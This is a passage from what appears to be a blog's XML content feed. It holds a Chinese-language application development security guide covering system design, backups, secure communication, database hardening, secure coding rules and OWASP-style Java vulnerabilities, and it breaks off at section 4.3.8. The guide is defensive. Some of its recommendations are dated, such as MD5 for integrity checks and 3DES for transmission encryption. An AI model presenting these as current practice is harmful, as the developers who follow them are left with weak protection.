使用单元测试和集成测试来审计你的设计和实现. [ ] 引入代码审查流程, 不要自行批准更改. [ ] 在推送到生产环境之前确保服务的所有组件都用杀毒软件静态地扫描过, 包括第三方库和其它依赖. [ ] 为部署设计一个回滚方案.]]></content>
      <categories>
        <category>Security</category>
      </categories>
      <tags>
        <tag>安全文档</tag>
        <tag>SDL</tag>
        <tag>Checklist</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[应用开发安全指南]]></title>
    <url>%2FSecurity%2F%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E5%AE%89%E5%85%A8%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[一、 概述本指南是IT安全保障体系建设规范的一个组成部分，全面阐述了IT系统应用开发整个软件生命周期所必须遵照的设计、编码、测试方面的安全要求，阐述了不同开发环境和编码语言条件下安全开发的相关规范要求。 1.1 目的本指南针对应用系统应当遵循的应用开发安全标准进行了规范性说明，旨在指导应用系统设计人员、代码开发人员和安全检查管理人员进行应用安全开发的安全配置，以提高应用系统的安全防护能力。 1.2 适用范围本指南适用于代码开发项目，作为在IT系统开发、设计环节中所遵照执行的依据。 1.3 适用对象本配置指南的适用人员包括：系统应用开发人员及安全检查管理人员。 二、 应用系统设计安全2.1 应用系统架构安全设计要求在应用系统设计阶段，应充分考虑该架构的安全性,包括B/S、C/S等形式的安全，主要体现在应用数据和用户会话的安全，还应当考虑应用系统自身体系架构内部的安全，以及与外系统接口的安全。针对某些特殊应用，还需考虑复、抗攻击等安全机制。所有的安全设计都是为了保证系统的稳定性和连续性，有针对性的解决自身安全问题。 2.1.1 应用系统自身架构安全 1、 自身结构中各组件之间通讯过程的安全机制组件之间的通讯包括命令级的和数据级的，应充分考虑： 传输命令和数据所采用的协议的安全性。应根据组件之间通讯内容安全性要求程度的不同选择不同安全性要求的协议； 考虑程序的模块之间的安全通讯机制； 不应使用标准的服务端口或者常见病毒、蠕虫等使用的服务端口。 2、 认证与访问控制机制，应考虑： 组件之间的信任机制； 用户的身份认证机制； 对于组件资源的访问控制机制； 不通用户对资源的权限控制机制。 3、 组件内重要文件和数据的安全防护机制：存在于组件内部的重要数据资源应当考虑其相应的安全防护机制，这些重要的数据资源包括： 配置文件； 用户数据，包括文件数据及数据库中的数据； 临时文件和数据； 与外系统或者系统内部其他组件接口用的数据文件。对这些重要数据的存取安全性设计，包括: 文件和数据存放是否加密及采用的加密方式。 2.1.2 应用系统与外系统接口的安全应用系统与外系统的接口安全设计，主要应考虑以下几个要素： 1、 与外系统的之间通讯中的安全机制。应充分考虑： 传输命令和数据所采用的协议的安全性。应根据系统之间通讯内容安全性要求程度的不同选择不同安全性要求的协议； 建议不使用默认的服务端口或者常见病毒、蠕虫等使用的服务端口，传输过程使用加密传输。 2、 与外系统的认证与访问控制机制，应考虑： 系统之间的信任机制； 会话凭据的有效时间； 可以访问资源的权限控制； 对于系统之间资源的访问控制机制。 3、 对外系统安全机制的符合性，应考虑： 如果外系统采用的接口方式经评估认为是安全的，本系统应当沿用其接口规范进行设计开发； 如果外系统采用的接口方式经评估认为存在安全缺陷，应商定采用更加安全的接口方式； 在考虑接口安全性的同时，也应当注意接口方式对双方系统性能、磁盘、连接数等各种性能指标和资源的影响。 2.1.3 应用系统其他的安全机制除了上述基本的安全架构设计内容外，针对不同的应用，以及应用系统的重要程度，可以补充考虑以下几种安全机制： 1、 针对Web应用的页面保护与恢复机制。利用专用的安全产品，或者系统自身设计时就考虑到了对于Web页面进行静态保护和监控问题，当监控到网页被篡改时能够实时恢复页面。 2、 针对特殊数据的完整性检查和监控机制。应用系统自身的审计机制。这一点也可算作是应用系统的安全功能设计的一部分，参见相关章节的要求。 3、 针对重要系统的DDOS攻击的解决方案。 4、 应用系统安全性分析。 5、 除了使用技术手段保证接口安全的同时，也需要保证接口相关代码和文件不被上传到互联网或泄漏给非必要人员。任何系统都会存在一定的安全缺陷，关键在于风险和缺陷是否可以被容忍，因此，在应用系统设计完成后，应当就其安全性问题进行自我分析和评价。 2.2 应用系统软件功能安全设计要求除了在架构上考虑的安全机制外，这些安全机制及相关的安全功能也应当分配在应用系统软件的各部件中。应用系统在开发中应该考虑如下几个方面的安全功能： 安全审计； 通讯安全（此部分内容在架构中进行了设计）； 数据保护； 认证与授权； 资源保障； 最小权限。 2.2.1 认证与授权功能的设计 1、 应用软件应包含用户身份认证体系的强度设计,重要系统应使用双因素或多因素认证措施，加强系统安全性： 用户名、口令认证； 一次性口令、动态口令认证； 证书认证；（可选） 生物特征的认证（签名、声音、指纹、虹膜、视网膜等）。（可选） 2、 应用软件应包含认证失败后的处理方式设计 连续失败3次，将锁定登录账号一个小时。账号锁定后可以由系统管理员解锁，也可以在一段时间后自动解锁； 通知用户认证失败，防止黑客暴力猜测； 验证码的功能，需要一定复杂度，防止被机器识别； 账号复杂度提醒功能。 3、 应用软件应包含用户权限分配和管理功能设计。 系统编码中要实现读、写、执行三个权限的分离设计； 系统查看、配置、修改、删除、登录、运行等权限设计； 数据访问范围的权限设计； 针对不同用户的数据库表权限隔离； 应用功能模块使用权限的设计。 4、 应用软件应包含接口设计，应明确系统的内部结构和外部接口，对于每一个对外接口应详细说明： 需要通信的对方系统的安全状况和可信程度； 需传送的数据的保密性和完整性要求； 对传送数据的合法性检验规则； 对通信可靠性的要求； 与外部系统的互相认证方面的需求； 信息传输过程的加密需求。 2.2.2 数据安全功能 1、 应用系统的数据安全功能，应当根据安全需求进行功能设计，内容涉及：数据库的安全、数据采集、数据传输、数据处理、数据存储、数据备份和恢复的安全。对重要的敏感数据应进行加密和完整性保护。 2、 应用软件应包含输入的安全性设计，主要指对错误输入、恶意输入进行处理。 3、 应用软件应包含输出的安全性设计。 2.2.3 安全审计功能 1、 应用系统具备如下安全审计功能： 审计功能的启动和关闭； 变更审计功能的配置信息； 至少应进行审计的事件：进入和退出的时间(登录、退出系统)、异常的系统使用行为(失败登录)、系统维护行为、敏感行为和其它安全功能要求的审计内容； 每个审计记录中至少记录如下信息：事件的日期和时间、事件的类型、主题标识、事件的结果(成功、失败)和事件相关信息。 2、 应用系统应支持数据查阅审计功能：按照主题、事件查阅；应用系统应明确用户能够查阅审计数据用户。 3、 在意外情况出现时，应有措施保证审计数据的可用性，当审计记录溢出时采取保护行动。 2.2.4 容错功能设计 1、 应用软件应包含各模块的出错处理设计。 2、 应用软件应包含可能出现的各种异常情况的安全处理设计，如：错误信息不回显给用户。 3、 应用软件应包含抗网络攻击的能力的设计及系统脆弱性分析。 4、 对于应用软件本身的资源及服务的优先保障设计。 2.3 应用系统存储安全设计要求在应用系统存储安全设计时，应对系统的存储容量、存储介质、存储备份内容、存储备份方式、存储设备功能要求及相关的存储技术统筹进行考虑。 2.3.1 应用系统的存储容量设计应依据对于应用数据的测算，估算应用系统的存储容量，建议在存储容量估算时应考虑以下要求： 在实际估算值上预留30%的存储余量，并考虑未来的应用存储量的增长需求。 考虑到应用系统自身的审计数据的容量、保存期限以配置相应的存储设备。 对于应用系统中的临时数据和过渡数据，应当设计其保存的时间，并以此考虑这部分的存储容量要求。 2.3.2 应用系统的存储介质选择应用系统的存储介质主要包括但不限于：磁带、光盘、磁盘、磁盘阵列和云存储。具体存储介质的选择应依据应用系统的业务种类及存储周期的要求，采用不同的介质。 1、 对于应用系统的交易数据，应采用高性能、高可靠的存储介质，如磁盘、磁盘阵列、云存储等进行存储； 2、 对于应用系统的历史数据，应采用可靠、稳定的存储介质，如磁带、光盘等进行存储。 2.3.3 应用系统存储备份对象应用系统对于其储存备份的对象设计，应包括如下内容： 1、 系统数据的备份：应包括Web服务器的网站内容、Mail服务器的邮件实时备份、数据库、文件服务器中的文件以及其他数据； 2、 系统的完全备份：应包括关键的、需要快速恢复的设备，通过磁带机的完全备份，应实现快速的灾难恢复； 3、 系统的冗余主机备份：对于关键并且不能停止的服务设备（如计费服务、Web、Mail服务器），应考虑使用多台主机进行冗余备份，以保证当任何一台主机发生故障时，服务器仍可提供服务； 4、 系统配置的备份：应包括关键路由器的配置、防火墙的配置、各类服务器操作系统的安全配置以及各类服务器（如Web、Mail、文件服务器等）中间件和容器（如Apache、tomcat、nginx、weblogic等）的配置。 2.3.4 应用系统存储备份方式应用系统应当根据不同的阶段，系统数据不同的重要程度，对数据采取不同的备份方式： 1、 完全备份使用备份介质对整个系统进行完全备份，包括系统和数据。这种备份方式的优点是直观，容易被人理解，而且当数据丢失时，可以快速恢复丢失的数据。它也有不足之处： 定期对系统进行完全备份，因此在备份数据中有大量的重复信息，占用了大量的存贮空间，增加了备份成本； 需要备份的数据量大，因此备份所需要的时间较长。 建议在关键性应用系统的实施前、实施后、变更以及升级等重要操作时，对操作系统进行完全备份。针对信息较小的不断变化的，且变化的内容大于50％的，定期进行完全备份。 2、 增量备份每次备份的数据只是相当于上一次备份后增加和修改过的数据。没有重复的备份数据，节省备份介质的空间，缩短了备份时间。这种备份的优点很明显，同时也存在某些不足之处，即当发生灾难时，恢复数据比较麻烦。建议在关键性应用系统正常运行维护阶段，针对变化的、不断增加的信息，定期进行增量备份。 3、 差异备份每次备份的数据只是相当于上一次完全备份后新增加和修改过的数据，即采用完全备份和差异备份相结合备份策略。如：每周日进行一次完全备份，而周一至周六进行差异备份。其优点为：没有重复的备份数据，即节省备份介质的空间，缩短了备份时间；缺点为：当发生灾难时，恢复数据比较麻烦。建议应用系统的正常运行维护阶段，针对不断变化的（变化的内容小于50％）系统，定期进行差异备份。 4、 按需备份按需备份是指在正常的备份安排之外，额外进行的备份操作，这种备份方式可以弥补冗余管理以及长期转存的日常备份的不足。因此它是一种非常灵活、重要的备份方式，在应用系统的各个阶段，如果备份的内容较少，可以采用按需备份。建议应用系统在下列情况下采取按需备份： 只需要备份很少的几个文件、目录、数据库或数据库中的表； 备份服务器上必要的配置文件。 5、 排除备份排除备份是指排除不需要的文件后再进行备份。从本质上讲，排除备份不是一种备份方法，只是减少备份冗余的一种方法。建议应用系统在下列情况下考虑排除备份： 有些文件非常大，但并不重要； 某些文件总是导致备份异常或出错。 6、 备份恢复测试不管是全备、增备、差异、按需还是排除备份，都应该定期对已被分的数据进行恢复测试，保证备份数据的可用性，在关键时刻可以及时并快速的恢复系统。 2.3.5 应用系统的存储设备功能要求应用系统存储设备的功能要求应包括如下内容： 1、 存储设备应保证数据的高可用性和完整性要求； 2、 存储设备应具有在多主机环境下工作的能力； 3、 存储设备应能方便地做到快速备份和恢复，重要系统应做到双机备份、支持热插拔； 4、 存储设备应有简便的、功能强大的管理工具，做到对整个存储系统的监视与控制。 2.4 应用系统通讯安全设计要求 1、 应采用安全通信协议对重要数据进行安全传输（尤其是账号、口令信息），如使用SSL/TLS、HTTPS、SFTP和IPSec、SCP等安全协议进行通信：终端与服务器端之间的WWW服务，建议使用HTTPS安全通信协议；终端与服务器端之间的FTP服务，建议使SFTP安全通信协议；终端与服务器端之间的Telnet服务，建议使SSH安全通信协议。 2、 终端应用程序采用加密传输机制对重要信息进行传输。 3、 终端应用程序采用完整性检查对业务的重要数据或敏感数据进行检查。 4、 终端应用程序应采用抗抵赖攻击技术对重要的交互信息进行保护。 5、 终端应用程序使用固定的通信端口。 6、 对于需要映射到公网的端口，不要使用原端口，在条件允许的情况下使用白名单访问。 2.5 应用系统数据库安全设计要求 1、 应从以下方面进行数据库的选型： 数据库、应用系统的运行环境； 数据库的稳定性、安全性（多级安全）； 数据库的容量（最多支持的库的数目、表的数目、记录数目）； 数据库的存取速度； 是否支持多种备份方式； 是否支持数据库的导入和导出。 2、 应明确数据库相关的用户管理、资源管理、特权管理和角色管理，明确各种用户的资源权限，并建立规范的权限文档。 3、 数据库原则上应及时更新重要补丁。在安装补丁前应先在测试环境进行，提前进行数据备份，充分准备回退方案和应急预案。 4、 数据库的配置应符合相应的基线配置要求。 5、 应及时修改数据库的默认密码或将默认账号锁定、删除。 6、 数据库的账号应根据业务和维护需要进行合理分配，避免账号共用。 7、 数据库每个用户之间的权限需要隔离。 8、 需要对数据库操作进行审计，包含：账号、操作、时间等指标。 2.6 应用系统数据安全设计要求2.6.1 数据采集安全应根据数据采集的内容、采集的频率、数据精确度要求、时间特性等来进行数据采集的安全要求设计，数据采集服务器和采集主机应考虑30%的系统开销及冗余。 2.6.2 数据传输安全 1、 应按照数据的类型、数据的重要程度、网络的安全状况等综合因素，对数据的传输采取不同的安全保护，包括但不限于防火墙、IDS、IPSEC-VPN、病毒防护等安全措施。 2、 应了解数据传输存在安全隐患的网络或设备，对存在安全隐患的网络采取必要的安全技术，包括但不限于安全通信协议、加密算法、完整性检查算法以及抗抵赖攻击方法等。 3、 应制定数据传输安全的检查方式，包括但不限于数据传输安全抗主动攻击能力检查、被动抗攻击的能力检查。 4、 应保障“数据传输安全”有关的重要配置参数安全，包括但不限于口令、加/解密算法、加/解密密钥等。 5、 应采用安全通信协议对数据进行安全传输，如使用SSL/TLS、HTTPS、SFTP和IPSec等安全协议进行通信。 6、 对传输的信息进行不同等级的加密保护，即根据网络或设备的风险、传输内容安全要求的不同，选择不同安全强度的加密算法对信息进行加密传输。建议使用RSA等高强度的密码算法对非常重要的信息（如口令、加密密钥）进行加密传输；对于普通数据的传输，可以采用RSA、3DES等相对安全的加密算法进行加密传输。 7、 应防止对所传输数据进行未经授权的任何形式的修改，即对业务的重要数据或敏感数据，建议使用MD5、SHA等算法对数据完整性进行保护。 8、 对重要的交互信息，建议采取抗抵赖技术，包括但不限于数字签名技术。 9、 为了配合网络其它安全设备，建议采用基于用户名/口令的认证技术、VLAN技术、MPLS技术等安全技术手段。 2.6.3 数据处理安全 1、 应根据数据的类型、数据的处理方式、数据的安全性要求、与其它接口有关的敏感等级、数据相关业务应用的重要性程度来进行数据处理过程的安全性设计。 2、 应对原始数据进行检错和校验操作，保证原始数据的正确性和完整性。 3、 数据在转换过程中，应采用通用的标准格式，应考虑相关的不同系统和不同应用的格式需求。 4、 数据处理过程应提供处理数据的状态信息和数据处理过程的动态信息。 5、 数据处理过程应具备异常处理功能，在任一环节发现问题，均应能及时回退，必要时可以人工处理。 6、 数据处理的中间过程和中间结果不能暴露给第三方。 3、 应用系统开发安全3.1 安全原则 1、 保护最薄弱的环节原则：保护最易受攻击影响的部分； 2、 纵深防御原则：不同层面、不同角度之间需要相互配合； 3、 最小权限原则：只授予执行操作所需的最小权限； 4、 最小共享原则：使共享文件资源尽可能少； 5、 权限分离原则：授予不同用户所需的最小权限，并在它们之间形成相互制约的关系； 3.2 需求管理阶段 1、 根据业务目标分析并制定系统安全目标； 2、 确认安全需求规格说明。 3.3 系统设计阶段 1、 根据安全目标执行威胁建模，识别威胁和风险； 2、 根据威胁建模制定对应开发安全任务： 确定安全体系架构，设计安全协议和安全接口； 确定访问控制与身份鉴别机制，定义主体角色和权限； 信息输入的安全过滤，信息输出的校验和控制； 数据结构安全设计，选择加密方法和算法； 确定敏感数据保护方法； 内部处理逻辑安全设计； 评估内部通信机制，确定完整性机制。 3.4 系统实现阶段 1、 开发环境安全管理要求： 软件系统开发、测试禁止在生产环境中进行； 开发环境中的开发用机应进行统一安全配置及时进行系统补丁升级和漏洞修复； 软件程序不得篡改应用软件所运行的环境或平台中任何安全配置、安全文件和安全程序。 2、 编码安全要求（后面会有详细讲解）： 遵循代码编写安全规范，根据代码编写安全规范以及安全设计方案进行系统开发； 遵循通用安全编程准则，包括输入验证、缓存溢出、安全调用组件和程序编译等； 遵循机密性要求，保护用户访问信息的机密性，严禁在客户端存放敏感数据 避免内存溢出，严格检查和验证输入输出信息等； 遵循结构化异常处理机制，捕捉并处理程序异常，防止系统信息泄露； 遵循代码脆弱性防范要求，包括缓冲区溢出、SQL注入、跨站脚本攻击、XML注入攻击、HTTP HEAD注入等。 3、 开发流程安全要求： 开发过程中应对阶段性开发成果进行有效管理； 开发过程中应定期进行代码静态分析，使用代码审核工具对源代码进行检测，并报告源代码中存在的安全弱点； 开发人员不得超越其规定权限进行开发，不得在程序中设置后门或恶意代码程序。 3.5 系统测试阶段 1、 测试内容应包括代码的安全测试和安全功能测试； 2、 代码的安全测试是指使用代码测试工具或渗透测试来识别代码的安全脆弱性，并应按照其提供的修复建议进行修复； 3、 安全功能测试主要包括身份认证和访问控制的功能测试； 4、 测试系统环境应尽可能模拟生产环境并与生产环境进行安全隔离； 5、 真实数据不得直接在测试环境中使用，须进行适当修改或屏蔽，在测试完成之后须立即从测试应用系统清除运行信息； 6、 测试人员编制安全测试方案，构造安全测试用例； 7、 验收测试不得由开发人员兼岗。 3.6 系统上线阶段 1、 系统上线须在内部验收通过后进行； 2、 需进行上线前试运行，确认应用系统是否符合上线要求； 3、 上线成功后，记录上线的日期和内容。 3.7 文档管理 1、 源代码的变更和版本发布进行统一控制，对程序资源库的任何修改、更新和发布都需经部门主管领导授权和批准； 2、 应指定专人妥善保管程序源代码及相关技术文档。 3.8 外包管理 1、应与外包开发单位签署相关知识产权保护协议和保密协议； 2、外包开发单位进行系统开发过程中须严格遵循本制度的相关安全要求； 3、在系统开发过程中须指派专人监督审核外包开发单位在各个阶段安全要求的执行情况； 4、外包开发单位在系统开发完成后提供程序源代码和相关技术文档，不得将计算机系统采用的关键安全技术措施和核心安全功能设计对外公开； 5、应对开发完成后的应用软件进行审查或检测。 4、 应用系统编码安全4.1 基本代码安全要求4.1.1 输入验证对函数入口参数的合法性和准确性进行检查，具体如下： 在B/S环境下，应进行服务端的验证而不仅仅是客户端的验证（例如基于Javascript的验证）。通过在客户端和服务器之间放置一个代理服务器，可以很容易绕过客户端验证。有了代理服务器，攻击者可以在数据被客户端“验证”后修改数据（与“中间人”攻击类似）。 在实际的校验中，输入校验首先定义一个有效（可接受）的字符集，然后检查每个数据的字符是否在有效范围内。如果输入中包含无效的字符，应用程序应该返回错误页面并说明输入中包含无效字符。这样进行验证的原因是定义无效的字符集比较困难，并且一些不应该有效的字符通常不会被指出。 另外，边界检查（例如字符串的最大长度）应该在字符有效性检查以前进行，边界分析可以防止大多数缓冲区溢出漏洞。 从环境变量获得的数据也需要进行验证，同时避免在环境变量中存放敏感数据（例如密码）。 4.1.2 SQL语句如果应用程序需要连接后端数据库，使用存储过程而不能在代码中使用SQL语句，使用程序以外的嵌入在代码中的SQL语句调用特别危险，难以防止攻击者使用输入域或者配置文件（由应用程序载入）来执行嵌入式的SQL攻击。当然，输入验证有助于缓解这种风险。 4.1.3 注释代码当应用程序在实际环境中开始应用时，应该删除所有的注释代码。注释代码是用来调试或者测试的，它们不是最终应用程序的一部分。无论如何应该在实际的环境中删除它们以避免意外的执行（一般注释标识被删除后就无法激活休眠的代码，但还是存在可能性的，所以强烈建议执行这项工作）。 4.1.4 错误消息所有为用户显示的错误信息都不应该暴露任何关于系统、网络或应用程序的敏感信息。如果可能，应使用包含编号的一般的错误信息，这种信息不返回给访问用户，只返回404错误，如“发生了错误（代码1234），请您与系统维护部门联系。 4.1.5 URL内容对于Web应用，不能在URL上暴露任何重要信息，例如密码、服务器名称、IP地址或者文件系统路径（暴露了Web服务器的目录结构），这些信息可以在攻击时被使用。 4.1.6 设置PATH变量设置PATH为一个已知的值，而不是仅仅使用启动时的缺省值。攻击者可以在攻击应用程序时使用PATH变量，例如试图执行一个任意的程序，这些可以应用于大多数其他的语言。 4.1.7 其他要求 1、 禁止使用未经授权和验证的代码。 2、 使用第三方代码，应对代码安全性进行评估和测试。 3、 测试用的“后门”，应在发布版中去除。 4、 规范代码的格式。 5、 规范变量、函数的命名； 6、 规范程序的书写格式，确保程序的易读性。 7、 对代码进行版本控制，确保代码的可用性。 8、 防止程序员非授权修改代码 9、 对代码的访问权限进行严格的权限控制； 10、 禁止在程序中添加隐藏“恶意”的代码，防止与应用系统相关的程序员对系统的非授权修改。 11、 应用系统不应在程序或进程中固化账号和口令。 12、 系统应具备对口令猜测的防范机制和监控手段。 13、 避免应用程序以错误的顺序运行，或者防止出现故障时，后续程序以不正常的流程运行。 14、采用正确的故障恢复程序，确保正确处理数据。 15、采取会话控制或批次控制，确保更新前后数据文件的一致性，例如：检查操作前后文件打开和关闭的数目是否一致。 16、检查执行操作前后对象的差额是否正常，如：句柄处理，堆栈等系统资源的占用与释放等。 17、严格验证系统生成的数据。 18、在网络传输过程中检查下载/上传的数据或软件的完整性。 19、检查文件与记录是否被篡改。例如通过计算哈希值（HASH）进行对比。 20、禁止私自讲代码上传到互联网。 4.2 Web编程安全基本要求4.2.1 输入检查安全 1、 限制用户输入HTML和Script(JavaScript、VBScript)代码。输入恶意HTML或Script（JavaScript、VBScript）代码可能会对其他浏览者造成混淆、欺骗或恶意破坏的结果。 2、 检查用户输入数据的长度。输入超出限定长度的数据，可能造成服务器端程序溢出。 3、 防止用户输入特殊字符改变SQL语义。输入含特殊字符的字串，篡改SQL语句的语义，可能造成SQL查询执行不该执行的操作，以此绕 4、 过身份认证获取非法权限、甚至对数据进行破坏。 5、 限制用户能够访问的最顶层目录。编写对服务器端文件、目录操作的程序时应该注意限定此类程序能够访问的最顶层目录，防止用户构造输入字串借助程序功能访问服务器关键文件导致泄漏服务器敏感信息。 6、 对所有类型的用户输入都要做检查，并严格限定什么是合法的用户输入，限定一个合法输入的范围，同时过滤有可能造成危险的特殊字符。 7、 对不可信任域发送到可信任域的数据一定要进行检查。 8、 尽可能在服务器端完成用户输入检查，不能轻易相信客户端脚本的检查结果。虽然客户端的Script脚本能完成一部分的用户输入检查功能，但这种检查的结果是不可信任的，攻击者可以自己制作表单程序绕过客户端脚本验证，将非法数据提交到服务器。 9、 在输入变为输出时，也要对特殊字符做检查和转换。 4.2.2 敏感数据的存放和传递安全 1、 敏感数据不能存放在Web页中。 2、 不能把敏感的数据存储在cookie、隐藏字段或者潜在地可能会被用户修改的地方。 3、 客户端向服务器端提交敏感数据应该经过加密（例如使用SSL），尽量不能明文传输。 4、 密码等敏感信息存放在数据库中应该加密，并采用健壮的加密算法。 5、 防止数据库被攻破后泄漏用户密码。 6、 敏感数据需要脱敏显示。 4.2.3 缓冲区溢出安全 1、 所有的输入都必须进行正确的有效性检测。 2、 必须保证数组没有越界，增加数组操作函数的边界检查。 3、 安全地使用字符串处理函数，慎用有安全隐患的字符串处理函数 4、 使用Format字符串的时候特别注意Unicode和ANSI的大小不一致的情况。 5、 注意字符串结束符的保护。 6、 仔细研究库函数内部的缓冲区分配，明确其限制。不能使用realpath()等函数，如果功能需要必须使用时，一定要检查试图规范化的路径的长度，确保其不长于MAXPATHLEN。 7、 时刻进行边界检查。建议使用一些检查工具：Purify、Stackguard等检查代码，保证没有缓冲区溢出的问题。 4.2.4 格式化字符串安全 1、 使用固定的格式化字符串，或者来自可信源的格式化字符串。 2、 要检查并限定locale的请求为合法值。 3、 不能将用户输入直接作为格式化字符传给格式化函数。 4.2.5 整数溢出安全 1、 对于涉及到内存分配大小的计算，要进行仔细检查，确保计算不会产生溢出。 2、 对于涉及到数组索引的计算，要进行仔细检查，确保计算不会产生溢出。 3、 要使用无符号整数表示数组偏移和内存分配大小。 4.2.6 SQL注入代码安全 1、 要检查输入的有效性和可信度。 2、 要使用参数化的查询、占位符、或者参数绑定来构造SQL语句。 3、 要在程序之外存储数据库的连接信息，比如经过保护的配置文件或者Windows注册表。 4、 即使使用的是存储过程，也不能使用字符串连接来构造SQL语句。 5、 不能在存储过程内部使用字符串连接来构造SQL语句。 6、 不能在存储过程内部执行不可信的参数。 7、 不能简单地双写单引号或者双引号。 8、 不能使用高权限账号连接数据库，比如sa或者root。 9、 不能在程序或者连接字符串中存储登录口令。 10、 不能在Web根目录下存储数据库配置信息。 11、 应从数据库中删除对所有用户自定义表的访问权限，同时只对存储过程授权，然后使用存储过程以及参数化的查询来构造查询字符串。 4.2.7 命令注入代码安全 1、 在输入命令传递给命令处理程序之前要进行验证。 2、 如果输入验证失败，要安全地处理失败信息。 3、 不能向任何命令解释器传递未验证的输入信息，即使这些输入仅仅是数据信息。 4、 避免使用正则表达式来进行输入验证，应手工去写一些简单而又清晰的验证代码。 4.2.8 异常处理代码安全 1、 要检测每个安全相关函数的返回值。 2、 对于每一个更改用户设定或者及其设定的函数，都要检查其返回值。 3、 要有从错误条件中进行恢复的考虑，避免拒绝服务攻击。 4、 不能一次性处理所有的异常，要将异常情况进行分类处理，避免在异常处理代码中的漏洞发生。 4.2.9 跨站脚本代码安全 1、 要对所有基于Web的输入进行输入验证和可信度验证。 2、 在没有验证合法性之前，不能对基于Web的输入进行回显。 3、 不能在cookie中存储敏感数据。 4.2.10 保护网络流量的代码安全 1、 要使用强大的初始认证机制。 2、 对应用程序所产生的所有网络流量都要执行过程中消息认证。 3、 尽可能使用SSL/TLS进行网络加密传输。 4.2.11 .应用中的弱口令代码安全 1、 确保口令在网络上认证时不被窃听。 2、 要在登录失败时给出错误提示，并记录失败口令尝试。 3、 尽可能使用基于hash强壮的单向加密函数进行口令存储。 4、 为用户更改口令提供安全的机制。 5、 不得使用默认账号和默认口令，若使用，必须在首次登录后进行修改。 6、 不得在程序、后台存储明文的口令。 7、 口令要有一定的强度，应当满足系统的账号口令策略要求。 4.2.12 SOCKET网络编程安全基本要求 1、 在socket函数调用时，明确参数中绑定的端口、IP地址和网卡接。Windows环境下，在遇到多个网卡的情况时，需要通过注册表来获得网卡接口和IP地址的信息，包括WindowsNT和windows2008。 2、 判断连接的合法身份。即，为防止恶意的连接以及可能是无效的连接，建议在socket连接期间，判断连接的对端是否是合法的真正的连接。 3、 对于UDP连接，可以获得连接对方的IP地址和端口，从而可以判断对方的有效性和合法性；对于TCP连接，由于每次连接需要三次握手，而且还有超时机制，存在两种方式来控制。 4、 对于TCP连接，需要尽量在三次握手完成前完成判断，同时防止端口扫描的攻击。 5、 尽可能确保socket应用能通过合理设置的防火墙。 6、 在可能的情况下，尽量减少socket连接数目。 7、 尽量不能使用回拨的技术。 8、 尽量采用有连接状态的协议，例如TCP协议。由于防火墙一般采取禁止一切的策略，对于UDP协议比较难以设置。 9、 在一个应用程序中，尽量使用同一种协议，不能使用多种协议。 10、尽量将客户端和服务器端的端口做成可以配置，不能硬编码在程序中。 4.3 JAVA安全开发要求JAVA语言安全规范参考OWASPTOP10要求，本指南列举了常见的JAVA开发安全要求。 4.3.1 防范跨站脚本（XSS）跨站脚本是最普遍的Web应用安全漏洞。当应用程序在发送给浏览器的页面中包含用户提供的数据，但没有经过适当验证或转译，就容易导致跨站脚本漏洞。攻击者能在受害者浏览器中执行脚本以劫持用户会话、危害网站、插入恶意内容和重定向用户等。已知三种著名跨站漏洞是：1）存储式；2）反射式；3）基于DOM。反射式跨站脚本通过测试或代码分析很容易找到。防范措施： 1、 验证输入检查每个输入的有效性，主要检查输入类型和数据的长度。 2、 编码输出对验证输入的另一面就是编码输出。编码输出是指确保字符被视为数据，而不是作为HTML元字符被浏览器解析。这些技术定义一些特殊的“转义”字符，没有正确转义的数据它仍然会在浏览器中正确解析。编码输出只是让浏览器知道数据是不是要被解析，达到攻击无法实现的目的。需要编码的部分：HTML实体、HTML属性、JavaScript、CSS、URL。 4.3.2 防范SQL注入简单来说，注入往往是应用程序缺少对输入进行安全性检查所引起的，攻击者把一些包含指令的数据发送给解释器，解释器把收到的数据转换成指令执行。注入漏洞十分普遍，通常能在SQL查询、LDAP查询、Xpath查询、OS命令、程序参数等中出现。注入能导致数据丢失或数据破坏、缺乏可审计性或是拒绝服务，注入漏洞有时甚至能导致完全接管主机。SQL注入包含了SQL注入、XPATH注入、LDAP注入、OS命令注入等。 4.3.3 防范恶意文件执行恶意文件执行是一种能够威胁任何网站形式的漏洞，只要攻击者在具有引入（include）功能程式的参数中修改参数内容，Web服务器便会引入恶意程序从而受到恶意文件执行漏洞攻击。攻击者可利用恶意文件执行漏洞进行攻击取得Web服务器控制权，进行不法利益或获取经济利益。 4.3.4 不安全的直接对象引用所谓“不安全的对象直接引用”，即Insecure direct object references，意指一个已经授权的用户，通过更改访问时的一个参数，从而访问到原本其并没有得到授权的对象。Web应用往往在生成Web页面时会用它的真实名字，且并不会对所有的目标对象访问时检查用户权限，所以这就造成了不安全的对象直接引用的漏洞。以下是不安全的对象直接引用示例： 攻击者发现他自己的参数是6065，即?acct=6065； 他可以直接更改参数为6066，即?acct=6066； 这样他就可以直接看到6066用户的账户信息了； 这种漏洞能损害参数所引用的所有数据。除非名字空间很稀疏，否则攻击者很容易访问该类型的所有数据。 4.3.5 防范跨站请求伪造跨站请求伪造，也被称成为“one-click attack”或者session riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。它与XSS非常不同，并且攻击方式几乎相左。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不太流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。攻击者能让受害用户修改可以修改的任何数据，或者是执行允许使用的任何功能。 4.3.6 信息泄露和错误处理不当应用程序常常产生错误信息并显示给使用者。很多时候，这些错误信息非常有用，因为它们揭示实施细则或有用的开发信息。泄露太多的细节（如错误堆栈跟踪信息、SQL语句等等）； 登录失败后，通知用户是否用户ID或密码出错——登录失败可能是由于ID或密码错误造成的。这为一个对关键资产发动蛮力攻击的攻击者提供重要信息。 4.3.7 残缺的认证和会话管理与认证和会话管理相关的应用程序功能往往得不到正确实施，这就导致攻击者破坏密码、密钥、会话令牌或利用实施漏洞冒充其他用户身份。这些漏洞可能导致部分甚至全部账号遭受攻击。一旦攻击成功，攻击者能执行合法用户的任何操作，因此特权账号会造成更大的破坏。编程要求： 使用内置的会话管理功能； 通过认证的问候； 使用单一的入口点； 确保在一开始登录SSL保护的网页； 获取注销的权利； 添加超时； 确保你使用的是安全相关的功能； 使用强大的认证； 不进行默认身份验证。 4.3.8 